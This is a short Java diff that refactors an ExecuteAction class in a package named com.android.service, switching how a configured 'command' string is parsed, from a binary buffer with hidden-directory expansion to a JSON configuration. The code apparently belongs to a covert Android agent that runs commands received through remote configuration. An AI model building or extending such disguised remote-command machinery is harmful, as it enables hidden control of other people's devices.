@@ -11,11 +11,14 @@ package com.android.service.action;
 
 import java.io.IOException;
 
+import org.json.JSONObject;
+
 import android.util.Log;
 
 import com.android.service.Messages;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.file.Directory;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -33,13 +36,11 @@ public class ExecuteAction extends SubAction {
 	/**
 	 * Instantiates a new execute action.
 	 * 
-	 * @param actionType
-	 *            the type
-	 * @param confParams
+	 * @param params
 	 *            the conf params
 	 */
-	public ExecuteAction(final int actionType, final byte[] confParams) {
-		super(actionType, confParams);
+	public ExecuteAction(final ActionConf params) {
+		super( params);
 	}
 
 	/*
@@ -84,21 +85,14 @@ public class ExecuteAction extends SubAction {
 	}
 
 	@Override
-	protected boolean parse(final byte[] params) {
-		final DataBuffer databuffer = new DataBuffer(params, 0, params.length);
-
-		try {
-			final int len = databuffer.readInt();
-			final byte[] buffer = new byte[len];
-			databuffer.read(buffer);
-
-			String cmd = WChar.getString(buffer, true);
-			this.command = Directory.expandHiddenDir(cmd);
+	protected boolean parse(final ActionConf params) {
+		try {			
+			this.command = params.getString("command");
 			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse): " + this.command);
 			}
-		} catch (final IOException e) {
+		} catch (final ConfigurationException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED");
 			}
